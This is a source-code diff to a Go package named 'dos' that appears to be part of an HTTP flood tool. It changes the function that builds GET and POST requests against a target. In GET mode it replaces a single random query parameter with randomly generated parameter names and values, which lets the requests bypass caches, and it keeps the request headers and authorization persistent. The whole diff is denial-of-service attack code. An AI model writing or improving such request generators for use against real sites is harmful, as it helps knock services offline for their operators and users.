@@ -5,7 +5,6 @@ package dos
 import (
 	"context"
 	"crypto/tls"
-	"fmt"
 	"log"
 	"math/rand"
 	"net/http"
@@ -270,8 +269,8 @@ func start(ctx context.Context, info *TargetInf, done chan<- struct{}) {
 func buildRequest(result chan<- *http.Request, info *TargetInf) {
 	// Return function
 	returnReq := func(req *http.Request) {
-		// add headers and authorization (if set) to request and make it persistent
-		if info.persistentHeaders == nil {
+		// Building initial request
+		if info.persistentHeaders == nil { // add headers and authorization (if set) to request and make it persistent
 			log.Println("INFO: Make Header and Authorization (if set) persistent") // log the build request
 			for key, value := range info.headers {
 				req.Header.Set(key, value)
@@ -283,34 +282,51 @@ func buildRequest(result chan<- *http.Request, info *TargetInf) {
 			}
 			info.persistentHeaders = req.Header.Clone()
 		} else {
-			req.Header = info.persistentHeaders
+			req.Header = info.persistentHeaders // reference persistent headers to request headers
 		}
-		result <- req
+		result <- req // send request over channel back to ... (maybe calling function, or, wherever the channel waits)
+	}
+
+	// random block function
+	buildblock := func(size int) string {
+		var block []rune
+		for i := 0; i < size; i++ {
+			block = append(block, rune(rand.Intn(25)+65))
+		}
+		return string(block)
 	}
 
 	// Building Request GET or POST mode available
 	if info.mode == "GET" {
-		// Build random parameter
-		r := rand.New(rand.NewSource(time.Now().UnixNano())) // Generate Random int
-		rndp := fmt.Sprintf("?rand=%d", r.Uint64())
+		// param joiner
+		var paramJoiner string
+		if strings.ContainsRune(info.webaddress, '?') {
+			paramJoiner = "&"
+		} else {
+			paramJoiner = "?"
+		}
 
-		// Building initial request and add values to request
-		req, err := http.NewRequest("GET", info.webaddress+rndp, strings.NewReader(info.formnames.Encode()))
+		/*
+			// Build random parameter
+			r := rand.New(rand.NewSource(time.Now().UnixNano())) // Generate Random int
+			rndp := fmt.Sprintf("?rand=%d", r.Uint64())
+		*/
+
+		// Building request and add values to request
+		req, err := http.NewRequest("GET", info.webaddress+paramJoiner+buildblock(rand.Intn(7)+3)+"="+buildblock(rand.Intn(7)+3), nil)
 		if err != nil {
 			log.Println("ERROR: building request")
 		}
 
-		req.Form = info.formnames // add url.Values too request
-
 		returnReq(req)
 	} else if info.mode == "POST" {
-		// Building initial request and add values to request
+		// Building request and add values to request
 		req, err := http.NewRequest("POST", info.webaddress, strings.NewReader(info.formnames.Encode()))
 		if err != nil {
 			log.Println("ERROR: building request")
 		}
 
-		req.PostForm = info.formnames // add url.Values too request
+		req.PostForm = info.formnames // reference url.Values too request
 
 		returnReq(req)
 	} else {
